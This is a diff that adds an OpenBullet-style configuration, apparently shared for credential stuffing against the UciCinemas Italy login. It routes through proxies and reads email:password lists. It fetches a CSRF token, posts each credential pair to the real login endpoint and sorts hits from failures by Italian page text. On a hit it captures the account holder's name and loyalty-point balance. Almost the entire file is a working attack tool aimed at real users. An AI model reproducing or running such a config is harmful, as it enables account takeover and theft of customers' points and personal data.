@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "UciCinema.it",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-11T18:43:28.0250973+00:00",
+  "AdditionalInfo": "Proxy Suggested",
+  "Author": "boggy94",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_TOKEN_CSRF REQUEST GET "https://login.ucicinemas.it/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://login.ucicinemas.it/" 
+PARSE "<SOURCE>" CSS "[name=\"_csrf_token\"]" "value" 0 -> VAR "TOKEN" "" "" 
+#REQUEST_POST REQUEST POST "https://login.ucicinemas.it/login" AutoRedirect=TRUE 
+  CONTENT "_username=<USER>&_password=<PASS>&_csrf_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://login.ucicinemas.it" 
+  HEADER "Referer: https://login.ucicinemas.it/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "CSRF token non valido " 
+    KEY "Email o password non corrette" 
+  KEYCHAIN Success OR 
+    KEY "ESCI" 
+REQUEST GET "https://www.skinucicard.it/reservedArea/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.skinucicard.it/reservedArea/" 
+#PARSE_POINTS PARSE "<SOURCE>" LR "tot_punti bg_saldo_punti\">" "</span>" Recursive=FALSE -> CAP "Punti" "" "" 
+#PARSE_NAME PARSE "<SOURCE>" LR "=\"nome_utente_header\">" "</span" Recursive=FALSE -> CAP "Nome" "" "" 
